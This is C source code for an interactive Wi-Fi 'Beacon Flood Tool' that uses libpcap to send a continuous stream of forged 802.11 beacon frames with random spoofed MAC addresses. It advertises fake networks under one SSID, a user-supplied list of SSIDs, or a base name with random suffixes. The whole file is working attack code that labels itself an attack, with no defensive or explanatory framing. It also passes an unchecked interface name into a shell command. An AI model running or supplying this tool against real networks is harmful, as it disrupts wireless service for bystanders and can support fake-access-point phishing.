#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "protocol.h"

typedef enum {
    MODE_SINGLE = 1,
    MODE_LIST = 2,
    MODE_RANDOM = 3
} FloodMode;

#define MAX_SSIDS 100
#define MAX_SSID_LEN 32

void generate_random_mac(uint8_t *mac) {
    for(int i=0; i<6; i++) {
        mac[i] = rand() % 256;
    }
    mac[0] &= 0xFE; 
    mac[0] |= 0x02;
}

void start_beacon_flood(char *interface, int channel, FloodMode mode, char ssids[MAX_SSIDS][MAX_SSID_LEN+1], int ssid_count, char *base_ssid) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    
    if (handle == NULL) {
        printf("Couldn't open device %s: %s\n", interface, errbuf);
        return;
    }

    printf("\n[+] Starting Beacon Flood Attack...\n");
    printf("Interface: %s\n", interface);
    printf("Channel  : %d\n", channel);
    if (mode == MODE_SINGLE) printf("Mode     : Single SSID (%s)\n", base_ssid);
    else if (mode == MODE_LIST) printf("Mode     : SSID List (%d items)\n", ssid_count);
    else if (mode == MODE_RANDOM) printf("Mode     : Random Suffix (Base: %s)\n", base_ssid);
    printf("Press Ctrl+C to stop.\n\n");

    // Seed for random
    srand(time(NULL));

    int list_index = 0;
    int seq_num = 1;

    while (1) {
        // Prepare current SSID based on mode
        char current_ssid[MAX_SSID_LEN + 1];
        
        if (mode == MODE_SINGLE) {
            strncpy(current_ssid, base_ssid, MAX_SSID_LEN);
        }
        else if (mode == MODE_LIST) {
            strncpy(current_ssid, ssids[list_index], MAX_SSID_LEN);
            list_index = (list_index + 1) % ssid_count;
        }
        else if (mode == MODE_RANDOM) {
            // Generates Base_1234
            snprintf(current_ssid, MAX_SSID_LEN, "%s_%d", base_ssid, rand() % 10000);
        }
        current_ssid[MAX_SSID_LEN] = '\0';
        int ssid_len = strlen(current_ssid);

        // 1. Setup Static Headers
        radiotap_header_t rt_hdr = {0, 0, 8, 0};
        
        // Frame Control: Type=00(Mgt), Subtype=1000(Beacon) => 0x8000 (Little Endian)
        dot11_header_t dot11_hdr = {{0x80, 0x00}, 0, {0}, {0}, {0}, 0};
        
        // Broadcast Address (FF:FF:FF:FF:FF:FF)
        memset(dot11_hdr.receiver_address, 0xFF, 6);
        
        // Random Source Address (Fake AP MAC) each time for "Flood" effect
        uint8_t fake_mac[6];
        generate_random_mac(fake_mac);
        memcpy(dot11_hdr.transmitter_address, fake_mac, 6);
        memcpy(dot11_hdr.bssid, fake_mac, 6);
        
        // Beacon Fixed Params
        beacon_fixed_params_t fixed_params;
        memset(fixed_params.timestamp, 0, 8); 
        fixed_params.beacon_interval = 0x0064; // 100 TU
        fixed_params.capability_info = 0x0411; 

        // 2. Tagged Parameters
        uint8_t tagged_params[256];
        int offset = 0;

        // Tag 0: SSID
        tagged_params[offset++] = 0x00;        // Tag ID (SSID)
        tagged_params[offset++] = ssid_len;    // Length
        memcpy(tagged_params + offset, current_ssid, ssid_len);
        offset += ssid_len;

        // Tag 1: Supported Rates
        uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
        tagged_params[offset++] = 0x01;
        tagged_params[offset++] = sizeof(rates);
        memcpy(tagged_params + offset, rates, sizeof(rates));
        offset += sizeof(rates);

        // Tag 3: DS Parameter Set (Channel)
        tagged_params[offset++] = 0x03;
        tagged_params[offset++] = 0x01;
        tagged_params[offset++] = (uint8_t)channel;

        // 3. Assemble Packet
        int packet_len = sizeof(rt_hdr) + sizeof(dot11_hdr) + sizeof(fixed_params) + offset;
        uint8_t *packet = (uint8_t *)malloc(packet_len);
        
        memcpy(packet, &rt_hdr, sizeof(rt_hdr));
        memcpy(packet + sizeof(rt_hdr), &dot11_hdr, sizeof(dot11_hdr));
        memcpy(packet + sizeof(rt_hdr) + sizeof(dot11_hdr), &fixed_params, sizeof(fixed_params));
        memcpy(packet + sizeof(rt_hdr) + sizeof(dot11_hdr) + sizeof(fixed_params), tagged_params, offset);

        // 4. Send Packet
        if (pcap_sendpacket(handle, packet, packet_len) != 0) {
            printf("Error sending packet: %s\n", pcap_geterr(handle));
        }

        free(packet);
        usleep(10000); // 10ms
    }

    pcap_close(handle);
}

// ----------------------------------------------------------------------------
// Main
// ----------------------------------------------------------------------------

int main() {
    char interface[64];
    int channel;
    int mode_choice;
    
    // Arrays for list mode
    char ssid_list[MAX_SSIDS][MAX_SSID_LEN+1];
    int list_count = 0;
    
    // Buffer for single/random mode
    char base_ssid[MAX_SSID_LEN+1];

    printf("=============================\n");
    printf("    Beacon Flood Tool v2.0\n");
    printf("=============================\n");
    
    printf("Enter Interface Name (e.g. wlan0mon): ");
    scanf("%s", interface);

    printf("Enter Channel to Flood (e.g. 1, 6, 11): ");
    scanf("%d", &channel);

    printf("\nSelect Attack Mode:\n");
    printf("1. Single SSID (Broadcasts one SSID repeatedly)\n");
    printf("2. SSID List (Cycle through a list of custom SSIDs)\n");
    printf("3. Random/Sequential Suffix (e.g. 'Office_412', 'Office_991')\n");
    printf("Choice: ");
    scanf("%d", &mode_choice);
    getchar(); // Consume newline

    FloodMode mode = (FloodMode)mode_choice;

    if (mode == MODE_SINGLE) {
        printf("Enter SSID: ");
        fgets(base_ssid, sizeof(base_ssid), stdin);
        base_ssid[strcspn(base_ssid, "\n")] = 0; 

    } else if (mode == MODE_LIST) {
        printf("Enter SSIDs one by one (Type 'DONE' to finish, Max %d):\n", MAX_SSIDS);
        while (list_count < MAX_SSIDS) {
            printf("SSID #%d: ", list_count + 1);
            char buf[128];
            fgets(buf, sizeof(buf), stdin);
            buf[strcspn(buf, "\n")] = 0; 
            
            if (strcmp(buf, "DONE") == 0 || strcmp(buf, "done") == 0) {
                break;
            }
            if (strlen(buf) > 0) {
                strncpy(ssid_list[list_count], buf, MAX_SSID_LEN);
                ssid_list[list_count][MAX_SSID_LEN] = 0; // Ensure null term
                list_count++;
            }
        }
        if (list_count == 0) {
            printf("No SSIDs entered. Exiting.\n");
            return 1;
        }

    } else if (mode == MODE_RANDOM) {
        printf("Enter Base SSID (Suffix will be added, e.g. 'MyWifi'): ");
        fgets(base_ssid, sizeof(base_ssid), stdin);
        base_ssid[strcspn(base_ssid, "\n")] = 0; 
    } else {
        printf("Invalid choice.\n");
        return 1;
    }

    // Set Channel
    char command[128];
    snprintf(command, sizeof(command), "iwconfig %s channel %d", interface, channel);
    system(command);
    
    start_beacon_flood(interface, channel, mode, ssid_list, list_count, base_ssid);

    return 0;
}
